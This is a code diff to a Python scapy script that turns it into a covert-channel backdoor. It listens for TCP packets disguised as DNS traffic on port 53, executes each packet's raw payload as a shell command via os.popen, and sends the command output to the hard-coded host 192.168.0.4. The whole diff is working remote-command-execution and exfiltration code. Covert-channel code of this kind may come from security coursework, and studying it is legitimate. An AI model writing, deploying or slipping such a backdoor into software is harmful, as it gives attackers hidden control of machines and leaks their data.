@@ -1,5 +1,6 @@
 import sys
 from scapy.all import *
+import os
 
 global clientIP
 global listening
@@ -34,10 +35,22 @@ global listening
 
 #Helper Functions
 def receivedPacket(packet):
-    print "Got a packet!"
-    print packet.show()
+    if IP in packet[0]:
+        srcIP = packet[IP].src
+        print "Got a packet!"
+        print packet.show
+        print packet["Raw"].load
+        command = packet["Raw"].load
+        print "Command is " + command
+        #Execute the command
+        f = os.popen(command)
+        result = f.read()
+        print "RESULT IS " + result
+        newPacket = (IP(dst="192.168.0.4")/TCP(sport=53, dport=500)/result)
+        send(newPacket)
+        return True
 
 #Start off by listening for connections
 listening = True;
 while listening:
-    sniff(filter='udp and dst port 53 and src port 500', stop_filter=receivedPacket)
+    sniff(filter='tcp and dst port 53 and src port 500', stop_filter=receivedPacket)
